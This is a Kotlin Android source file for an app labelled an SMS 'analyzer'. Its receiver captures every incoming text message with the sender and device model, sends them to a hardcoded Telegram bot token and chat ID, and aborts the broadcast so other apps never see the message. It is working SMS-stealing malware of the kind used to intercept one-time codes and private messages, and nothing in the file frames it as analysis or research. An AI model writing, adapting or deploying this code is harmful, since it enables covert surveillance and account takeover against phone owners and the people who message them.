package com.analyzer.smsbeta

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody

class SmsReceiver : BroadcastReceiver() {
    private val client = OkHttpClient()

    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action == Telephony.Sms.Intents.SMS_DELIVER_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            for (smsMessage in messages) {
                val sender = smsMessage.originatingAddress ?: "Unknown"
                val message = smsMessage.messageBody ?: "Empty"
                val device = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
                
                sendToTelegram(sender, message, device)
                abortBroadcast() // Prevent other apps from receiving
            }
        }
    }

    private fun sendToTelegram(sender: String, message: String, device: String) {
        val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
        val chatId = "6331293386"
        val url = "https://api.telegram.org/bot$botToken/sendMessage"
        
        val text = """
            New SMS Received!
            From: $sender
            Message: $message
            Device: $device
        """.trimIndent()

        try {
            val mediaType = "application/json".toMediaType()
            val body = """
                {"chat_id":"$chatId","text":"$text","parse_mode":"Markdown"}
            """.trimIndent().toRequestBody(mediaType)

            val request = Request.Builder()
                .url(url)
                .post(body)
                .build()

            client.newCall(request).execute().close()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
